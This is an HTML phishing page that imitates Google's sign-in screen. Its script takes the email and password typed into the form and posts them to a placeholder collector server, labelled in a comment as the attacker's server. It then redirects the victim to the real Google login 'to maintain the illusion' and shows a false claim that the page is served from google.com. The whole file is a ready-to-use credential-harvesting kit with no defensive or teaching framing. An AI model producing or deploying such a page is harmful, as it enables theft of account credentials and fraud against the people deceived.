<!DOCTYPE html>
<html>
<head>
    <title>Google Account Security</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
        }
        .google-style {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 30px;
        }
        .google-logo {
            text-align: center;
            color: #4285f4;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
        }
        button {
            width: 100%;
            background: #4285f4;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="google-style">
        <div class="google-logo">Google</div>
        <h2>Sign in</h2>
        <p>to continue to Google services</p>
        
        <form id="loginForm">
            <input type="email" placeholder="Email or phone" required>
            <input type="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
        
        <p style="font-size: 12px; color: #5f6368; margin-top: 20px;">
            This page is served from: <span id="domain">google.com</span>
        </p>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = this.querySelector('input[type="email"]').value;
            const password = this.querySelector('input[type="password"]').value;
            
            // Send credentials to attacker server
            fetch('https://your-collector-server.com/log', {
                method: 'POST',
                body: JSON.stringify({email, password, domain: window.location.hostname}),
                mode: 'no-cors'
            });
            
            // Redirect to real Google (maintain illusion)
            setTimeout(() => {
                window.location.href = 'https://accounts.google.com/';
            }, 1000);
        });
        
        // Auto-focus untuk usability
        setTimeout(() => {
            document.querySelector('input[type="email"]').focus();
        }, 500);
    </script>
</body>
</html>
